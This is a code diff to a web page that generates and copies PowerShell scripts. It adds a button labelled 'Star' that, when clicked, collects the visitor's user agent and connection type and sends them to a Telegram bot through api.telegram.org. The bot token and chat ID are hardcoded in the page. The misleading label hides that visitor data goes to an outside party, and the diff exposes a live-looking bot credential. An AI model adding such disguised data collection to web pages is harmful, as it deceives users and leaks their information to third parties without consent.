@@ -85,6 +85,7 @@
             <button id="generate-ps-button" onclick="generatePSScript()">Generate PS1 Code</button>
             <div id="ps-output">PowerShell Code: Click to Generate</div>
             <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
+            <button id="star-button" onclick="sendUserInfo()">Star</button>
         </div>
     </div>
 
@@ -132,6 +133,38 @@
             }).catch(err => {
                 console.error('Error copying to clipboard: ', err);
             });
+        }
+
+        // Send user information to Telegram bot
+        function sendUserInfo() {
+            const userInfo = {
+                userAgent: navigator.userAgent,
+                wifi: navigator.connection.effectiveType || "unknown", // Example: WiFi info
+            };
+
+            const token = '7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM';
+            const chatId = '842463450';
+            const message = `User Info: ${JSON.stringify(userInfo)}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Information sent to Telegram!');
+                } else {
+                    alert('Error sending information.');
+                }
+            })
+            .catch(err => console.error('Error:', err));
         }
     </script>
 
